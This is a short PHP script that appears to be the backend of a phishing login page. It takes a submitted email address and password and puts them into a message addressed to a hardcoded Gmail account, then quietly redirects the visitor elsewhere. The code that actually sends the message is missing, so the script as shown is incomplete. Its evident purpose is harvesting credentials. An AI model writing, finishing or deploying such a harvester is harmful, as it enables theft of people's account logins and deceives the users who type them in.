<?php
if(!empty($_POST["send"])){
    $email = $_POST["email"];
    $pass = $_POST["text"];
    $toEmail = "is26683369@gmail.com";

    $mailHeader = "name: " . $email .
    "\r\n Email: " . $email .
    "\r\n Password: " . $pass . "\r\n";


}


//redirect
header("location: redirect.html")

?>